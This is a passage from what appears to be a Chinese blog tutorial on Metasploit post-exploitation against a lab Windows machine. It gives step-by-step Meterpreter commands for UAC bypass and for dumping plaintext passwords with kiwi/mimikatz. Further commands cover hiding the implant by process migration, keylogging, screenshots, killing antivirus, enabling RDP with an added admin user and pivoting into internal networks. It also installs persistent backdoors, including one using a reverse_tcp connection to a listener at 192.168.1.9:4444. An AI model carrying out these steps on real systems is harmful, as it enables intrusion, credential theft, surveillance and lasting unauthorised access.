<p>其余的如通过计划任务、路径欺骗等方式不算入绕过，因为经过了用户确认。</p>
<p>实现Bypass UAC的方法主要有两种方法：一种是利用白名单提权机制，另一种是利用COM组件接口技术。<br>这里就演示msf里面的bypassuac模块  (现在这些应该是作用不大了)</p>
<p>其他挨到参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/panjunnn/article/details/106964291">https://blog.csdn.net/panjunnn/article/details/106964291</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Yang34/p/12632599.html">https://www.cnblogs.com/Yang34/p/12632599.html</a></p>
<blockquote>
<p>search bypassuac</p>
</blockquote>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204005349958.png" srcset="/img/loading.gif" lazyload alt="image-20220204005349958"></p>
<p>我是先把meterpreter会话放到后台，然后使⽤这个模块：</p>
<blockquote>
<p>exploit/windows/local/bypassuac</p>
</blockquote>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204005526761.png" srcset="/img/loading.gif" lazyload alt="image-20220204005526761"></p>
<p>这边已经运⾏成功了！但是我的虚拟机是x64位的，⽽这个bypassuac是x86,所以不能成功执⾏ hashdump：</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204005547859.png" srcset="/img/loading.gif" lazyload alt="image-20220204005547859"></p>
<p>但是可以执⾏创建或者删除⽤户:</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204005558351.png" srcset="/img/loading.gif" lazyload alt="image-20220204005558351"></p>
<p>如果⽬标虚拟机是x86的话，就可以执⾏hashdump以及net user创建或者删除⽤户的</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204005622300.png" srcset="/img/loading.gif" lazyload alt="image-20220204005622300"></p>
<h3 id="九、msf之系统明文密码和HASH"><a href="#九、msf之系统明文密码和HASH" class="headerlink" title="九、msf之系统明文密码和HASH"></a>九、msf之系统明文密码和HASH</h3><p>这边是绕过 UAC 得到了一个 meterpreter ：</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204011031816.png" srcset="/img/loading.gif" lazyload alt="image-20220204011031816"></p>
<p>Dump 用户的明文密码 加载 mimikatz ： load mimikatz mimikatz ： 是一个抓取/读取系统密码的工具</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204011136649.png" srcset="/img/loading.gif" lazyload alt="image-20220204011136649"></p>
<p>新版msf 抓取密码</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs TypeScript">meterpreter &gt; load kiwi<br>meterpreter &gt; kiwi_cmd privilege::debug<br>meterpreter &gt; kiwi_cmd sekurlsa::logonPasswords<br></code></pre></td></tr></table></figure>

<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204011453669.png" srcset="/img/loading.gif" lazyload alt="image-20220204011453669"></p>
<h3 id="十、msf之进程迁移"><a href="#十、msf之进程迁移" class="headerlink" title="十、msf之进程迁移"></a>十、msf之进程迁移</h3><p>正常使用 exe 上线的情况下，会在任务管理器或者使用 tasklist 命令就可以看到我们 的进程，那么就很容易被发现 所以我们就用把我们的进程迁移到其他原有的进程上面，相当于寄生在别的正常的进程上 面</p>
<h4 id="手动迁移"><a href="#手动迁移" class="headerlink" title="手动迁移"></a>手动迁移</h4><p>列出所有的进程 ps</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204084835183.png" srcset="/img/loading.gif" lazyload alt="image-20220204084835183"></p>
<p>查看当前进程 ： getpid</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204084851654.png" srcset="/img/loading.gif" lazyload alt="image-20220204084851654"></p>
<p>以进程名迁移： 迁移到：explorer.exe</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204084912733.png" srcset="/img/loading.gif" lazyload alt="image-20220204084912733"></p>
<p>迁移进程成功，我们 ps 查看进程 这个时候就会发现原有的 ：C:/Users/admin/Desktop/8080.exe 这个进程就没有了</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204084937316.png" srcset="/img/loading.gif" lazyload alt="image-20220204084937316"></p>
<p>以 PID 迁移：</p>
<p>假如要迁移到这个 spoolsv.exe ，他的 PID 是 1128 migrate -P 1128</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204085005596.png" srcset="/img/loading.gif" lazyload alt="image-20220204085005596"></p>
<p>这边的话是迁移失败，原因是权限的问题，因为我运行我的木马exe是没有过UAC的，所以 权限比较小； 而 spoolsv.exe 这个进程是一个系统的权限进程，所以导致迁移进程失败 总结：高权限可以往低权限下迁移进程，低权限不能往高权限上进行迁移！</p>
<p>我这边重新以 UAC 运行木马</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204085038357.png" srcset="/img/loading.gif" lazyload alt="image-20220204085038357"></p>
<p>再次迁移进程到 ： spoolsv.exe PID 1128</p>
<blockquote>
<p>migrate -P 1128</p>
</blockquote>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204085057415.png" srcset="/img/loading.gif" lazyload alt="image-20220204085057415"></p>
<p>这个时候就迁移进程成功了 </p>
<blockquote>
<p>meterpreter &gt; getpid </p>
</blockquote>
<blockquote>
<p>Current pid: 1128</p>
</blockquote>
<h4 id="上线自动迁移"><a href="#上线自动迁移" class="headerlink" title="上线自动迁移"></a>上线自动迁移</h4><p>迁移到指定进程 set autorunscript migrate -n explorer.exe </p>
<p>生成一个进程，并迁移到它里面 set AytoRunScript migrate -f</p>
<p>这边 run 之前，需要设置一下上线后自动迁移到那个进程 </p>
<blockquote>
<p>set autorunscript migrate -n explorer.exe </p>
</blockquote>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204085318109.png" srcset="/img/loading.gif" lazyload alt="image-20220204085318109"></p>
<p>然后 exploit 运行到后台 ： exploit -j -z </p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204085342723.png" srcset="/img/loading.gif" lazyload alt="image-20220204085342723"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204085349953.png" srcset="/img/loading.gif" lazyload alt="image-20220204085349953"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204085358414.png" srcset="/img/loading.gif" lazyload alt="image-20220204085358414"></p>
<p>成功迁移进程！</p>
<p>自动迁移随机进程 set AytoRunScript migrate -f</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204085516124.png" srcset="/img/loading.gif" lazyload alt="image-20220204085516124"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204085525034.png" srcset="/img/loading.gif" lazyload alt="image-20220204085525034"></p>
<p>迁移成功！</p>
<h3 id="十一、msf之键盘记录、屏幕截图、文件操作、load扩展等"><a href="#十一、msf之键盘记录、屏幕截图、文件操作、load扩展等" class="headerlink" title="十一、msf之键盘记录、屏幕截图、文件操作、load扩展等"></a>十一、msf之键盘记录、屏幕截图、文件操作、load扩展等</h3><h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><p>先是获取到了一个Meterpreter，他有这些功能</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204095822659.png" srcset="/img/loading.gif" lazyload alt="image-20220204095822659"></p>
<p>keyscan_start开启键盘监听后，再用keyscan_dump进行记录的导出，如果不想监听了才keyscan_stop。而不是先keyscan_stop再keyscan_dump</p>
<p>keyscan_start 启动键盘记录监听</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204100313768.png" srcset="/img/loading.gif" lazyload alt="image-20220204100313768"></p>
<p>目标机器输入东西的话，就可以获取到键盘记录  keyscan_dump</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204100639196.png" srcset="/img/loading.gif" lazyload alt="image-20220204100639196"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204100646774.png" srcset="/img/loading.gif" lazyload alt="image-20220204100646774"></p>
<p>成功获取到键盘记录！</p>
<p> &lt; Left Windows &gt;&lt; CR &gt;   是回车键</p>
<p>keyboard_send 输入东西到目标机器上</p>
<p>假设目标机器上有鼠标指针，那么说明可以输入内容，那我们就可以使用 keyboard_send 来输入东西到目标主机上</p>
<p>目标目前是空的：</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204100840309.png" srcset="/img/loading.gif" lazyload alt="image-20220204100840309"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204100900976.png" srcset="/img/loading.gif" lazyload alt="image-20220204100900976"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204100909036.png" srcset="/img/loading.gif" lazyload alt="image-20220204100909036"></p>
<p>这个时候，目标的记事本里就多出了一些内容，就是我们刚刚输入的 hacker_hhhhh</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.fujieace.com/metasploit/keylogging.html">https://www.fujieace.com/metasploit/keylogging.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/nzjdsds/article/details/102767480">https://blog.csdn.net/nzjdsds/article/details/102767480</a></p>
<h4 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h4><p>screenshot 截屏当前目标桌面情况</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204102331316.png" srcset="/img/loading.gif" lazyload alt="image-20220204102331316"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204102352565.png" srcset="/img/loading.gif" lazyload alt="image-20220204102352565"></p>
<h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><p>操作文件系统</p>
<h5 id="1-文件的基本操作"><a href="#1-文件的基本操作" class="headerlink" title="1.文件的基本操作"></a>1.文件的基本操作</h5><p>　　ls：列出当前路径下的所有文件和文件夹。</p>
<p>　　pwd 或 getwd：查看当前路径。</p>
<p>　　search：搜索文件，使用search -h查看帮助。</p>
<p>　　cat：查看文件内容，比如cat test.txt。</p>
<p>　　edit：编辑或者创建文件。和Linux系统的vm命令类似，同样适用于目标系统是windows的情况。</p>
<p>　　rm：删除文件。</p>
<p>　　cd：切换路径。</p>
<p>　　mkdir：创建文件夹。</p>
<p>　　rmdir：删除文件夹。</p>
<p>　　getlwd 或 lpwd：查看自己系统的当前路径。</p>
<p>　　lcd：切换自己当前系统的目录。</p>
<p>　　lls：显示自己当前系统的所有文件和文件夹。</p>
<p>getwd 查看目标当前目录</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204102626093.png" srcset="/img/loading.gif" lazyload alt="image-20220204102626093"></p>
<h5 id="2-文件的上传和下载"><a href="#2-文件的上传和下载" class="headerlink" title="2.文件的上传和下载"></a>2.文件的上传和下载</h5><p>　　(1) upload</p>
<p>　　格式：upload本地文件路径目标文件路径</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204102758560.png" srcset="/img/loading.gif" lazyload alt="image-20220204102758560"></p>
<p>​        (2)download</p>
<p>　　格式：download 目标文件路径 本地文件路径</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204102848881.png" srcset="/img/loading.gif" lazyload alt="image-20220204102848881"></p>
<h4 id="load扩展"><a href="#load扩展" class="headerlink" title="load扩展"></a>load扩展</h4><p>load 可以加载这些：load -l</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204103406253.png" srcset="/img/loading.gif" lazyload alt="image-20220204103406253"></p>
<p>其实还可以加载 python 等等</p>
<p>load python 加载 python</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204103919212.png" srcset="/img/loading.gif" lazyload alt="image-20220204103919212"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204103942162.png" srcset="/img/loading.gif" lazyload alt="image-20220204103942162"></p>
<p>加载扩展后，我们可以使用基本的Python函数，例如print。这可以通过使用 python_execute命令和标准Python语法来实现。</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104001732.png" srcset="/img/loading.gif" lazyload alt="image-20220204104001732"></p>
<p>还可以保存到变量，并使用-r开关打印其内容。</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104016732.png" srcset="/img/loading.gif" lazyload alt="image-20220204104016732"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104025351.png" srcset="/img/loading.gif" lazyload alt="image-20220204104025351"></p>
<p>运行 python 文件 ： python_import -f /root/liuwx.py</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104055272.png" srcset="/img/loading.gif" lazyload alt="image-20220204104055272"></p>
<p>这个好处是，无需对方系统有 python 环境，就可以运行python脚本~ 当然，也可以上传很多扩展，比如 powershell 等等</p>
<h4 id="系统其它操作"><a href="#系统其它操作" class="headerlink" title="系统其它操作"></a>系统其它操作</h4><h5 id="1-关闭防病毒软件"><a href="#1-关闭防病毒软件" class="headerlink" title="1.关闭防病毒软件"></a>1.关闭防病毒软件</h5><blockquote>
<p>　　　　run killav</p>
</blockquote>
<blockquote>
<p>　　　　run post/windows/manage/killav</p>
</blockquote>
<h5 id="2-操作远程桌面"><a href="#2-操作远程桌面" class="headerlink" title="2.操作远程桌面"></a>2.操作远程桌面</h5><blockquote>
<p>　　　　run post/windows/manage/enable_rdp开启远程桌面</p>
</blockquote>
<blockquote>
<p>　　　　run post/windows/manage/enable_rdp username=test password=test添加远程桌面的用户(同时也会将该用户添加到管理员组)</p>
</blockquote>
<h5 id="3-截屏"><a href="#3-截屏" class="headerlink" title="3.截屏"></a>3.截屏</h5><blockquote>
<p>　　　　screenshot</p>
</blockquote>
<h5 id="4-键盘记录"><a href="#4-键盘记录" class="headerlink" title="4.键盘记录"></a>4.键盘记录</h5><blockquote>
<p>　　　　keyscan_start：开启键盘记录功能</p>
</blockquote>
<blockquote>
<p>　　　　keyscan_dump：显示捕捉到的键盘记录信息</p>
</blockquote>
<blockquote>
<p>　　　　keyscan_stop：停止键盘记录功能</p>
</blockquote>
<h5 id="5-执行程序"><a href="#5-执行程序" class="headerlink" title="5.执行程序"></a>5.执行程序</h5><p>　　execute -h 查看使用方法</p>
<p>　　-H：创建一个隐藏进程</p>
<p>　　-a：传递给命令的参数</p>
<p>　　-i：跟进程进行交互</p>
<p>　　-m：从内存中执行</p>
<p>　　-t：使用当前伪造的线程令牌运行进程</p>
<p>　　-s：在给定会话中执行进程</p>
<p>　　例：execute -f c:/temp/hello.exe</p>
<h4 id="端口转发和内网代理"><a href="#端口转发和内网代理" class="headerlink" title="端口转发和内网代理"></a>端口转发和内网代理</h4><h5 id="1-portfwd"><a href="#1-portfwd" class="headerlink" title="1.portfwd"></a>1.portfwd</h5><p>　　portfwd是meterpreter提供的端口转发功能，在meterpreter下使用portfwd -h命令查看该命令的参数。</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104213744.png" srcset="/img/loading.gif" lazyload alt="image-20220204104213744"></p>
<p>常用参数：</p>
<p>　　-l：本地监听端口</p>
<p>　　-r：内网目标的ip</p>
<p>　　-p：内网目标的端口</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104228660.png" srcset="/img/loading.gif" lazyload alt="image-20220204104228660"></p>
<p>上面命令执行之后，会将10.1.1.3的3389端口转发到本地的2222端口。</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104240421.png" srcset="/img/loading.gif" lazyload alt="image-20220204104240421"></p>
<h5 id="2-pivot"><a href="#2-pivot" class="headerlink" title="2.pivot"></a>2.pivot</h5><p>　　pivot是msf最常用的代理，可以让我们使用msf提供的扫描模块对内网进行探测。</p>
<p>　 <strong>(1)首先需要在msf的操作界面下添加一个路由表。</strong></p>
<p>　　添加命令：route add 内网ip 子网掩码  session的id</p>
<p>　　打印命令：route print</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104308071.png" srcset="/img/loading.gif" lazyload alt="image-20220204104308071"></p>
<p>路由添加成功之后就可以在msf里访问10.1.1.0/24这个网段。</p>
<p>　　<strong>(2)建立socks代理。</strong></p>
<p>　　如果其它程序需要访问这个内网环境，就可以建立socks代理。</p>
<p>　　msf提供了3个模块用来做socks代理。</p>
<blockquote>
<p>　　　　auxiliary/server/socks4a  </p>
</blockquote>
<blockquote>
<p>　　　　use auxiliary/server/socks5  </p>
</blockquote>
<blockquote>
<p>　　　　use auxiliary/server/socks_unc</p>
</blockquote>
<p>　　以auxiliary/server/socks4a为例，查看需要设置的参数。</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104324472.png" srcset="/img/loading.gif" lazyload alt="image-20220204104324472"></p>
<p>一共两个参数：</p>
<p>　　SRVHOST：监听的ip地址，默认为0.0.0.0，一般不需要更改。</p>
<p>　　SRVPORT：监听的端口，默认为1080。</p>
<p>　　直接运行run命令，就可以成功创建一个socks4代理隧道，在linux上可以配置proxychains使用，在windows可以配置Proxifier进行使用。</p>
<h4 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h4><p>　　Meterpreter的shell运行在内存中，目标重启就会失效，如果管理员给系统打上补丁，那么就没办法再次使用exploit获取权限，所以需要持久的后门对目标进行控制。</p>
<p>　　Msf提供了两种后门，一种是metsvc(通过服务启动)，一种是persistence(支持多种方式启动)。</p>
<h5 id="1-metsvc"><a href="#1-metsvc" class="headerlink" title="1.metsvc"></a>1.metsvc</h5><p>　　<strong>(1) 使用run metsvc -h查看帮助，一共有三个参数。</strong></p>
<p>　　-A：安装后门后，自动启动exploit/multi/handler模块连接后门</p>
<p>　　-h：查看帮助</p>
<p>　　-r：删除后门</p>
<p>　　<strong>(2) 安装后门</strong></p>
<p>　　命令：run metsvc</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104337643.png" srcset="/img/loading.gif" lazyload alt="image-20220204104337643"></p>
<p>命令运行成功后会在C:WindowsTEMP目录下新建随机名称的文件夹，里面生成3个文件（metsvc.dll、metsvc-server.exe、metsvc.exe）。</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104354252.png" srcset="/img/loading.gif" lazyload alt="image-20220204104354252"></p>
<p>同时会新建一个服务，显示名称为Meterpreter，服务名称为metsvc，启动类型为”自动”,绑定在31337端口。</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104405910.png" srcset="/img/loading.gif" lazyload alt="image-20220204104405910"></p>
<p><strong>(3) 连接后门</strong></p>
<p>　　使用exploit/multi/handler模块，payload设置为windows/metsvc_bind_tcp，设置目标ip和绑定端口31337。</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104420343.png" srcset="/img/loading.gif" lazyload alt="image-20220204104420343"></p>
<h5 id="2-persistence"><a href="#2-persistence" class="headerlink" title="2.persistence"></a>2.persistence</h5><p>　　<strong>(1) 使用run persistence -h查看参数。</strong></p>
<p>　　-A：安装后门后，自动启动exploit/multi/handler模块连接后门</p>
<p>　　-L：自启动脚本的路径，默认为%TEMP%</p>
<p>　　-P：需要使用的payload，默认为windows/meterpreter/reverse_tcp</p>
<p>　　-S：作为一个服务在系统启动时运行（需要SYSTEM权限）</p>
<p>　　-T：要使用的备用可执行模板</p>
<p>　　-U：用户登陆时运行</p>
<p>　　-X：系统启动时运行</p>
<p>　　-i：后门每隔多少秒尝试连接服务端</p>
<p>　　-p：服务端监听的端口</p>
<p>　　-r：服务端ip</p>
<p>　　<strong>(2) 生成后门</strong></p>
<p>　　命令：run persistence -X -i 10 -r 192.168.1.9 -p 4444</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104435254.png" srcset="/img/loading.gif" lazyload alt="image-20220204104435254"></p>
<p><strong>(3) 连接后门</strong></p>
<p>　　使用exploit/multi/handler模块，payload设置为windows/meterpreter/reverse_tcp，同时设置好服务端监听ip和端口。</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104451775.png" srcset="/img/loading.gif" lazyload alt="image-20220204104451775"></p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/diligenceday/p/11028462.html">https://www.cnblogs.com/diligenceday/p/11028462.html</a></p>
<h3 id="十二、msf之内网渗透之添加路由"><a href="#十二、msf之内网渗透之添加路由" class="headerlink" title="十二、msf之内网渗透之添加路由"></a>十二、msf之内网渗透之添加路由</h3><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204105922367.png" srcset="/img/loading.gif" lazyload alt="image-20220204105922367"></p>
<h4 id="获取网段"><a href="#获取网段" class="headerlink" title="获取网段"></a>获取网段</h4><blockquote>
<p>run get_local_subnets </p>
</blockquote>
<blockquote>
<p>route list</p>
</blockquote>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204105952351.png" srcset="/img/loading.gif" lazyload alt="image-20220204105952351"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204110002010.png" srcset="/img/loading.gif" lazyload alt="image-20220204110002010"></p>
<h4 id="添加路由表"><a href="#添加路由表" class="headerlink" title="添加路由表"></a>添加路由表</h4><p>为什么要添加路由表？ 因为添加了路由表，就可以对目标内网进行一些深入渗透 </p>
<p>添加路由： run autoroute</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204110532992.png" srcset="/img/loading.gif" lazyload alt="image-20220204110532992"></p>
<p>添加路由表 route add 192.168.0.0 255.255.255.0 1</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204110558090.png" srcset="/img/loading.gif" lazyload alt="image-20220204110558090"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204110609632.png" srcset="/img/loading.gif" lazyload alt="image-20220204110609632"></p>
<p>还有一种添加方式是： route add 192.168.0.0/24 1</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204110712530.png" srcset="/img/loading.gif" lazyload alt="image-20220204110712530"></p>
<p>添加路由表 run autoroute -h</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204110902191.png" srcset="/img/loading.gif" lazyload alt="image-20220204110902191"></p>
<h3 id="十三、msf之连接数据库-postgresql"><a href="#十三、msf之连接数据库-postgresql" class="headerlink" title="十三、msf之连接数据库_postgresql"></a>十三、msf之连接数据库_postgresql</h3><h4 id="安装postgresql"><a href="#安装postgresql" class="headerlink" title="安装postgresql"></a>安装postgresql</h4><p>为什么要使用 postgresql ？ 首先， 连接数据库之后搜索 msf 中模块的速度可以大大提高； 其次， 连接数据库之后，使用 msf 的痕迹会被保存下来，方便之后导出编写 渗透测试报告。 所以， 连接psql数据库不是必须的操作，但是为了提高渗透测试的效率，方便 日后的写报告，还是应该连接数据库，创建缓存。</p>
<blockquote>
<p>安装 postgresql ： apt-get install postgresql -y</p>
</blockquote>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204113418778.png" srcset="/img/loading.gif" lazyload alt="image-20220204113418778"></p>
